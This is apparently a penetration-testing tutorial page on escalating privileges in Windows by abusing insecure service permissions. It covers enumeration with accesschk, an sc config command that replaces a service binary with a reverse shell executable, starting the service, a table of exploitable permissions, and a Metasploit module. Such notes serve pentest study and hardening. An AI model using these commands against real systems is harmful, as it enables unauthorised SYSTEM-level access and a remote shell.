# Insecure Service Permissions

Services with Insecure service permissions could allow for privilege escalation. If the current user has the ability to write to or replace the service path binary and, the service is started with privileged permissions such as SYSTEM it could be possible to elevate, providing the service is running in.

`Acesschk.exe` can be used to check what permission a particular user has to services. A wildcard is used to check all services.

```bash
.\accesschk.exe /accepteula -uwcqv "<User>" *
```

![](<../../../../.gitbook/assets/image (18) (2).png>)

From the above output _SERVICE\_CHANGE\_CONFIG_ indicates we are able to alter the service configuration and change the binary path.

![](<../../../../.gitbook/assets/image (264).png>)

As from the above value _SERVICE\_START\_NAME_ represents the user in which the service runs under.

The command below can be used to alter the binary to a new, malicious binary.

```bash
sc config daclsvc binpath= "\"C:\PrivEsc\reverse_shell.exe\""
```

Once the binary path has been changed the service can then be started by either using the command below or rebooting the system if permissions allow.

```bash
net start <ServiceName>
```

**Interesting Service permissions**

| Permission              | Description                                          |
| ----------------------- | ---------------------------------------------------- |
| GENERIC\_ALL            | Inherits SERVICE\_CHANGE\_CONFIG                     |
| GENERIC\_WRITE          | Inherits SERVICE\_CHANGE\_CONFIG                     |
| SERVICE\_CHANGE\_CONFIG | Able to alter service binary                         |
| WRITE\_DAC              | Able to alter permissions -> SERVICE\_CHANGE\_CONFIG |
| WRITE\_OWNER            | Able to become owner and change permissions          |

### Metasploit Module

```
use exploit/windows/local/service_permissions
```
